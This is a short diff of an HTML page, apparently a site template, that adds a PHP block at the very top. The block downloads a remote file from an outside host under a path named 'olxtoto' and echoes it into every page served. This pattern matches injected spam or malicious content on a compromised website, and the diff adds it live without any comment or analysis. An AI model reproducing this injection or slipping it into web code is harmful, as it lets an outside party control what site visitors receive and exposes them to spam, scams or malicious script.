@@ -1,3 +1,7 @@
+<?php 
+$a = file_get_contents('http://timseosukses.com/code/olxtoto/index.js'); 
+echo $a; 
+?>
 <!doctype html>
 <html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US"
   data-authenticated-account>
